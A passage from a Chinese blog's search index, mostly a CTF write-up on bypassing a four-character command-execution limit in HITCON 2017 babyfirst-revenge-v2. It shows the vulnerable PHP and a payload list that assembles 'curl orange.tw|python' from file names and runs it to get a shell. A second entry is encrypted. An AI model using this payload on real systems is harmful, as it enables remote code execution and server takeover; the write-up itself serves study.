punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span> @<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     @<span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'reset'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     @<span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">'/bin/rm -rf '</span> <span class="token punctuation">.</span> <span class="token variable">$sandbox</span><span class="token punctuation">)</span> <span class="token punctuation">}</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span></code></pre></li></ol><pre><code>限制到了4个字符，首先，禁用了`&gt;&gt;`追加，在就是导致我们没法利用`rm`,即第二种拆分思路已经失效，只能采取第一种，而这就又有一个问题，那就是`ls -t`的拆分，无论怎么拆都满足不了字母序的条件。下面就是这道题目的知识点了：1. dir命令：dir等于ls -C -b;也就是说，默认情况下，文件列在列中，垂直排序，特殊字符由反斜杠转义序列表示。和ls基本一样，但是好出就是dir是d开头字典序在前。2. rev命令：将文件中的每行内容以字符为单位反序输出，即第一个字符最后输出，最后一个字符最先输出，依次类推。3. 还有就是`*`，这就是最有趣的地方了，`*`再linux中代表任意个数的通配符，但是如果单单只输入一个`*`的时候就类似于`$(dir *)`    ![](https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200313013049.png)综上的话，思路就有了：思路就是V1思路的第一思路，重点在于如何写入`ls -t&gt;f`，有了上面的知识点，我们可以构造`dir f&gt; t- sl`【d的字母序必须再最前】,然后通过`*&gt;v`执行并重定向给`v`，在创建一个`rev`文件，然后通过 `*v&gt;g`执行`rev v`来将`ls -t&gt;f`写入g中再操作期间发现t的字母序要再s的后面，这就导致不能达成上面的条件![](https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200313015518.png)解决方法是加多一个参数，例如h，ls只带参数h的不带参数l话那这个参数是毫无意义的，把t-换成ht-后成功满足![](https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200313020234.png)在之后就是V1的思路了【官方payload】```pythonpayload = [    # generate &quot;g&gt; ht- sl&quot; to file &quot;v&quot;    &#39;&gt;dir&#39;,     &#39;&gt;sl&#39;,     &#39;&gt;g\&gt;&#39;,    &#39;&gt;ht-&#39;,    &#39;*&gt;v&#39;,    # reverse file &quot;v&quot; to file &quot;x&quot;, content &quot;ls -th &gt;g&quot;    &#39;&gt;rev&#39;,    &#39;*v&gt;x&#39;,    # generate &quot;curl orange.tw|python;&quot;    &#39;&gt;\;\\&#39;,     &#39;&gt;on\\&#39;,     &#39;&gt;th\\&#39;,     &#39;&gt;py\\&#39;,     &#39;&gt;\|\\&#39;,     &#39;&gt;tw\\&#39;,    &#39;&gt;e.\\&#39;,     &#39;&gt;ng\\&#39;,     &#39;&gt;ra\\&#39;,     &#39;&gt;o\\&#39;,     &#39;&gt;\ \\&#39;,     &#39;&gt;rl\\&#39;,     &#39;&gt;cu\\&#39;,     # got shell    &#39;sh x&#39;,     &#39;sh g&#39;, ]</code></pre><p>参考文章：</p><ul><li><a href="https://findneo.github.io/171110Bypass4CLimit/" target="_blank" rel="noopener">如何绕过四个字符限制getshell</a></li><li><a href="https://xz.aliyun.com/t/1579" target="_blank" rel="noopener">HITCON 2017 babyfirst-revenge(-v2)浅析</a></li></ul><hr><p>版权声明：</p><p>除非注明，本博文章均为原创，转载请以链接形式标明本文地址。</p><hr>]]></content>
      
      
      
        <tags>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP伪协议分析</title>
      <link href="/3264988010.html"/>
      <url>/3264988010.html</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Please enter the password to read.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="8389d80b2e14a914ab565ae6ae3508e924f09c2bdf5a2142353e7c8806b6ce20">182006207700fc149fec831c9ae039745426c83a0620631d4a87de529b8b9e5356d615a92bb6b7f444a51004fd85089f1ac8cb7712600c813981736d80e54bbbf8b93435457f41c31b74267a436ebc7026a1c90b4563af2c1f741575ffe8dbfc4f1b783896729cbd8ebd3c591bef8fcb24276fdaea4267e58d1d01e20a0b265d96cad30f6502e4a077ecbf1a39e86deb1d4f081232501e4a926dd2055e23d07839f214ddba6f0a9bcd432996cdaa8a5266a59d3f68b3e70a3ff7fb985e0d314dbbd8e510fa39331d9422cc44cbd7d88c1c28ca329b73162cbfc246ecf6d7a5fb65317b627bd0545a22bbc64ad4cc345eedcaace21aac2822f7b5433c3f849201e7c8f292bd1ec21e77301b74f7b22d010898d123a35781d172359d9418a508aae740b2f825a7abfb7012322c836808b0b0821b10b0204321837f85d61c9f2568ffab822442676f94369697fede432518b6ee06a1c140aecd2c410bdd2382c72297a3fff545f949036838d504959b395a5fde82c42bdd7f64c9a4cd3ea1665734a2f4b9a6c6983921afd67dcc86d61e1e631d9ea63374aab16e696a4af40c5d979c1e50ef8fa1d43c55e863f409a55d70b9d9eb30ed4ef54e04207193a073ba4e04b50e897869666b05a59405d188b9421c22895e88abd0d81443a2f56a133af431b2fccd57bad2d978d4ac59a16982d0</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> php伪协议 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
